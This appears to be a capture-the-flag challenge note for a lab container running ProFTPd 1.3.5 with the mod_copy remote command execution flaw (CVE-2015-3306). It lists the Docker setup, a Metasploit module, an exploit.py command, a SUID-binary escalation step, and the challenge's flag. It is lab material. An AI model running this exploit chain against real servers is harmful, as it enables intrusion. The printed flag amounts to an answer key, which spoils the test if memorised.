Challenge 3 ProFTPd (Transfer) 21:21


This challenge is based on the ProFTPd 1.3.5 - (mod_copy) Remote Command Execution cve-2015-3306

The container source is here:
https://github.com/t0kx/exploit-CVE-2015-3306

docker build -t sploitftp .

docker run -d --rm -it -p 2121:21 -p 8080:80 sploitftp



Notes:
If using metasploit the path must be /var/www/html
use exploit/unix/ftp/proftpd_modcopy_exec



./exploit.py --host 127.0.0.1 --port 21 --path "/var/www/html/"

Find SUID binary /usr/bin/dog

in shell run /usr/bin/dog to print flag

Flag will be located in /root/flag
bsb17_da39a3ee5e6b4b0d3255bfef95601890afd80709
